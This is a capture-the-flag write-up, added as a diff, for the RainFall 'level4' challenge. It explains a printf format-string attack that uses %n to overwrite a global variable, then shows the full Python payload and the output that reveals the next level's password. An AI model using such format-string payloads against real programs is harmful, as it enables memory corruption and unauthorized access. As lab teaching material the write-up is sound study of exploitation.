@@ -1,0 +1,17 @@
+The program level4 contains a function `n` with calls to `fgets` and `n`, which call `printf`. Also, a system call with the string "/bin/cat /home/user/level5/.pass" is done, guarded by a cmp & jne.
+
+The exploit is the same than the previous exercice, except that the integer condition is greater than the buffer we can write to (16930116).
+But, with the printf format string, we can print any number of char we want, using a format conversion with padding.
+
+Using this, we can now build our exploit like such:
+- byte 0-4: The address of the global variable which is compared to 16930116
+- byte 4-16930116: Filler data to reach 16930116 written bytes, using a printf format conversion
+- rest: %12\$n, formatter used to set the variable to 16930116 (the 12 was found by testing all printf arguments)
+
+The end result looks like this:
+`python -c "print ('\x08\x04\x98\x10'[::-1] + '%16930112zu' + '%12\$n')" | ./level4 | python -c "print raw_input().split()"`
+
+level4@RainFall:~$ python -c "print ('\x08\x04\x98\x10'[::-1] + '%16930112zu' + '%12\$n')" | ./level4 | python -c "print raw_input().split()"
+['\x10\x98\x04\x08', '0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a']
+
+the second elem of the array is the key.
